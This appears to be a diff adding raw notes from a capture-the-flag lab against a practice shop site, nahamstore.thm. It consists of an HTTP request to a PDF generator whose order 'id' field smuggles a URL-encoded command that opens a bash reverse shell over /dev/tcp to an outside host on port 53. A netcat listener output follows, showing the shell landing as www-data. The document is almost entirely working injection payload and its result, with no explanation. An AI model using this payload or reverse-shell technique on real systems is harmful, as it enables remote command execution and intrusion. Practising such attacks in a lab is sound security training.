@@ -1,0 +1,48 @@
+
+
+
+
+
+
+
+
+
+POST /pdf-generator HTTP/1.1
+Host: nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Origin: http://nahamstore.thm
+Connection: keep-alive
+Referer: http://nahamstore.thm/account/orders/4
+Cookie: session=5c7660082f4caf683c8ffbc6af57bd1d; token=c8f5bd50c7774cd517182f7bf727402e
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+Content-Length: 67
+
+what=order&id=4%60bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.6.66.96%2F53+0%3E%261%22%60
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53    
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.113.116] 38332
+bash: cannot set terminal process group (40): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2431fe29a4b0:~/html/public$ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
